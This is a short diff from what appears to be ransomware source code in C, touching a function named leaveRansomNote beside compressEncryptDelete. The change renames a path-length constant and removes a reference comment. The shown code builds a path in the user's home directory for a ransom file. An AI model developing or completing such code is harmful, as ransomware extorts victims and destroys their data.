@@ -882,12 +882,11 @@ int compressEncryptDelete(const string path) {
 int leaveRansomNote() {
     // Function attempt to leave a ransom file on the user desktop
     string msg;
-    char ransomFile[MAX_PATH];
+    char ransomFile[PATH_MAX];
     struct passwd *user = NULL;
 
     // We will first get the user with getuid() then get the struct of
     // passwd file for that user.  We can find the home directory at pw_dir
-    // http://stackoverflow.com/questions/2910377/get-home-directory-in-linux-c
     user = getpwuid(getuid());
 
     // We will build out the path for the ransomFile
